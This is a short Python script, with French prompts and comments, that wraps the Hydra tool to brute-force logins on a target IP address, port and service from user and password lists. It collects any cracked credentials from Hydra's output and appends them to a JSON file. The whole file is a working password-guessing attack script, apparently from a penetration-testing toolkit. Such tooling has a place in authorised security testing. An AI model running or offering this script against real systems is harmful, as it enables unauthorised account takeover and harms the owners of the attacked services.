#!/usr/bin/python3

import subprocess
import json

def bf_hydra(ip_address, port, service, chemin_utilisateurs, chemin_mots_de_passe):
    nombre_sessions = input("Entrez le nombre de sessions que vous voulez lancer en simultané (laissez vide pour utiliser le nombre de session par défaut (5)) :")
    if not nombre_sessions:
        nombre_sessions = "5"

    try:
        print("Lancement de l'attaque Hydra en cours...")

        # Exécuter Hydra en mode verbose
        process = subprocess.Popen(["hydra", "-t", nombre_sessions, "-L", chemin_utilisateurs, "-P", chemin_mots_de_passe, ip_address, service, "-s", str(port), " -vV"], stdout=subprocess.PIPE, universal_newlines=True)

        # Analyser la sortie en temps réel
        credentials_found = []
        for line in process.stdout:
            if "login:" in line and "password:" in line:
                credentials_found.append(line.strip())

        process.wait()  # Attendre la fin de l'exécution d'Hydra

        # Vérifier si des identifiants ont été trouvés
        if credentials_found:
            print("\nBruteForce réussi, voici les identifiants trouvés :")
            for cred in credentials_found:
                print(cred)
            return credentials_found
        else:
            print("\nPas de couple d'identifiants trouvés")
            return None

    except subprocess.CalledProcessError as e:
        print(f"Erreur lors du test de la vulnérabilité avec Hydra : {e}")
        return None

def generer_json(credentials, nom_fichier):
    if credentials:
        with open(nom_fichier, "a") as f:
            json.dump(credentials, f, indent=4)
            f.write("\n")
            return True
    else:
        return False
